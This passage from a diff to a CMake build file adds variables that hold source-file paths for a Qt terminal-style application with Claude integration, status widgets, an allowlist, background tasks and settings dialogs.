+        MAINWINDOW_CPP="${CMAKE_SOURCE_DIR}/src/mainwindow.cpp"
+        SRC_CLAUDESTATUSWIDGETS_PATH="${CMAKE_SOURCE_DIR}/src/claudestatuswidgets.cpp"
+        SRC_CLAUDESTATUSWIDGETS_CPP_PATH="${CMAKE_SOURCE_DIR}/src/claudestatuswidgets.cpp"
+        SRC_CLAUDESTATUSWIDGETS_H_PATH="${CMAKE_SOURCE_DIR}/src/claudestatuswidgets.h"
+        CLAUDESTATUSWIDGETS_CPP="${CMAKE_SOURCE_DIR}/src/claudestatuswidgets.cpp"
+        SRC_CLAUDEALLOWLIST_PATH="${CMAKE_SOURCE_DIR}/src/claudeallowlist.cpp"
+        SRC_CLAUDE_INTEGRATION_CPP_PATH="${CMAKE_SOURCE_DIR}/src/claudeintegration.cpp"
+        SRC_CLAUDE_INTEGRATION_H_PATH="${CMAKE_SOURCE_DIR}/src/claudeintegration.h"
+        CLAUDETABTRACKER_H="${CMAKE_SOURCE_DIR}/src/claudetabtracker.h"
+        COLOREDTABBAR_H="${CMAKE_SOURCE_DIR}/src/coloredtabbar.h"
+        COLOREDTABBAR_CPP="${CMAKE_SOURCE_DIR}/src/coloredtabbar.cpp"
+        SRC_AI_CPP="${CMAKE_SOURCE_DIR}/src/aidialog.cpp"
+        SRC_AIDIALOG_CPP="${CMAKE_SOURCE_DIR}/src/aidialog.cpp"
+        SRC_SETTINGSDIALOG_CPP="${CMAKE_SOURCE_DIR}/src/settingsdialog.cpp"
+        SRC_SETTINGSDIALOG_H="${CMAKE_SOURCE_DIR}/src/settingsdialog.h"
+        SRC_CONFIGPATHS_H="${CMAKE_SOURCE_DIR}/src/configpaths.h"
+        SRC_BGTASKS_CPP_PATH="${CMAKE_SOURCE_DIR}/src/claudebgtasks.cpp"
+        SRC_BGTASKS_H_PATH="${CMAKE_SOURCE_DIR}/src/claudebgtasks.h"
+        SRC_BGDIALOG_CPP_PATH="${CMAKE_SOURCE_DIR}/src/claudebgtasksdialog.cpp"
+        SRC_BGDIALOG_H_PATH="${CMAKE_SOURCE_DIR}/src/claudebgtasksdialog.h"
+        SRC_CMAKELISTS_PATH="${CMAKE_SOURCE_DIR}/CMakeLists.txt")
 endif()
